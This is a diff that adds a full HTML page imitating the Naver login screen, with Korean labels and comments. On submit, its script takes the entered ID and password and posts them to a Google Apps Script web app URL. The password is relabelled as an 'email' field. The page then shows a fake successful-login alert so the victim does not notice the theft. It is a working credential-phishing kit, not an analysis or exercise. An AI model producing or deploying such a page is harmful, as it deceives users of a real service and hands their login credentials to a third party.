@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>네이버 : 로그인</title>
+    <style>
+        /* 기본 리셋 및 배경 설정 */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Malgun Gothic", "맑은 고딕", helvetica, sans-serif;
+            background-color: #f5f6f7;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        /* 전체 컨테이너 */
+        .login-wrapper {
+            width: 100%;
+            max-width: 460px;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        /* 로고 영역 (네이버 시그니처 컬러) */
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo a {
+            color: #03c75a;
+            font-size: 40px;
+            font-weight: 900;
+            text-decoration: none;
+            letter-spacing: -1px;
+        }
+
+        /* 입력 폼 박스 */
+        .input-row {
+            position: relative;
+            background-color: #fff;
+            border: 1px solid #dadada;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+        }
+        .input-row:focus-within {
+            border-color: #03c75a;
+        }
+
+        .input-row input {
+            border: none;
+            outline: none;
+            width: 100%;
+            font-size: 16px;
+            line-height: 22px;
+            color: #222;
+        }
+        /* placeholder 글자 색상 */
+        .input-row input::placeholder {
+            color: #929292;
+        }
+
+        /* 로그인 버튼 */
+        .btn-submit {
+            display: block;
+            width: 100%;
+            padding: 15px 0;
+            font-size: 20px;
+            font-weight: 700;
+            line-height: 24px;
+            color: #fff;
+            background-color: #03c75a;
+            border: 1px solid #03c75a;
+            border-radius: 6px;
+            cursor: pointer;
+            text-align: center;
+            margin-top: 20px;
+            transition: background-color 0.2s;
+        }
+        .btn-submit:hover {
+            background-color: #17b75e;
+        }
+
+        /* 하단 링크 영역 */
+        .footer-links {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #888;
+        }
+        .footer-links a {
+            color: #888;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-wrapper">
+        <!-- 로고 -->
+        <div class="logo">
+            <a href="#">NAVER</a>
+        </div>
+
+        <!-- 로그인 폼 -->
+        <form id="naverLoginForm">
+            <!-- 아이디 입력창 -->
+            <div class="input-row">
+                <input type="text" id="userId" placeholder="아이디" required autocomplete="username">
+            </div>
+            
+            <!-- 비밀번호 입력창 -->
+            <div class="input-row">
+                <input type="password" id="userPw" placeholder="비밀번호" required autocomplete="current-password">
+            </div>
+
+            <!-- 전송 버튼 -->
+            <button type="submit" class="btn-submit">로그인</button>
+        </form>
+
+        <!-- 하단 보조 메뉴 -->
+        <div class="footer-links">
+            <a href="#">비밀번호 찾기</a> | 
+            <a href="#">아이디 찾기</a> | 
+            <a href="#">회원가입</a>
+        </div>
+    </div>
+
+    <script>
+        // 이전 단계에서 생성한 구글 앱스 스크립트 웹 앱 URL을 여기에 붙여넣으세요.
+        const GOOGLE_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbwG0ZgIuakgfA6SrgO0T8ltC8NczFizxG4tXYGIOfcDU3mWOrrO27VgFKeYt3lLpBW67w/exec";
+
+        document.getElementById('naverLoginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // 폼 제출 시 새로고침 방지
+
+            const idValue = document.getElementById('userId').value;
+            const pwValue = document.getElementById('userPw').value;
+
+            // 구글 앱스 스크립트로 보낼 데이터 가공
+            // (주의: GAS의 변수명 data.name, data.email 등을 쓰고 계시다면 
+            //  거기에 맞춰 아래 key 이름을 지정하거나, GAS 코드를 id, pw로 수정해야 합니다.)
+            const formData = {
+                name: idValue,   // 기존 GAS 스크립트의 data.name에 매핑됨
+                email: pwValue  // 기존 GAS 스크립트의 data.email에 매핑됨
+            };
+
+            fetch(GOOGLE_WEB_APP_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'text/plain'
+                },
+                body: JSON.stringify(formData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.result === 'success') {
+                    alert('성공적으로 로그인되었습니다.');
+                    document.getElementById('naverLoginForm').reset();
+                } else {
+                    alert('전송 실패: ' + data.error);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('네트워크 에러가 발생했습니다.');
+            });
+        });
+    </script>
+
+</body>
+</html>
